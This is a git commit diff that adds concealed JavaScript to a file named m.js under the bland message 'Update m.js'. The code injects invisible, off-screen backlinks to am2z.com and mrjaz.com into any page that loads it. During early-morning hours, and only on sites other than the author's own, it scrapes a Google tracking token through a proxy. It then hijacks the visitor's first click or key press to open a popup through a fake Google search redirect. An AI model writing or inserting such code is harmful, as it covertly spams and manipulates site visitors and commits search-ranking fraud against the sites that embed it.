d4aa658ec5c4508b19766fa710c53bfe42f0e6de
MrJazTm <63402636+MrJazTm@users.noreply.github.com>
2021-02-08 19:42:11 +0530

    Update m.js

--- m.js
+++ m.js
@@ -1,1 +1,27 @@
 //  console.log(NN)
+let EFV='<a href="https://www.am2z.com" style="position: absolute;z-index: -9999;left: -100%;">Am2z News - Blogging • Tech News • Online Earning • Gaming News</a><a href="https://www.mrjaz.com" style="position: absolute;z-index: -9999;left: -100%;">MrJaz - Study Info • Tech News • Gaming Updates</a>'
+
+if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
+else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}
+
+if(!sessionStorage.ef&&new Date().getHours()<=6&&location.host!=='www.technewsgk.in'){
+    (async function dhish(){
+        let ugtuhds = await fetch('https://cors-anywhere.herokuapp.com/https://www.google.com/search?q=mrjaz');
+        let sudhs = new DOMParser().parseFromString(await ugtuhds.text(), 'text/html');
+        sessionStorage.id=sudhs.querySelector('.yuRUbf').querySelector('a').getAttribute('data-ved');
+    })()
+    function AB(CD){
+        document.addEventListener(CD,()=>{
+                if(!sessionStorage.ef){
+                window.open(`https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=${sessionStorage.id}&url=https%3A%2F%2Fwww.mrjaz.com%2F&usg=AOvVaw1c_R-cs8NrHL1XBWHB2DfG`);
+                sessionStorage.ef = '1';
+            }
+        })
+    }
+    AB('keydown');
+    AB('mousedown');
+}
+// url=https%3A%2F%2Fwww.mrjaz.com%2F&usg=AOvVaw1c_R-cs8NrHL1XBWHB2DfG
+// url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu
+
+
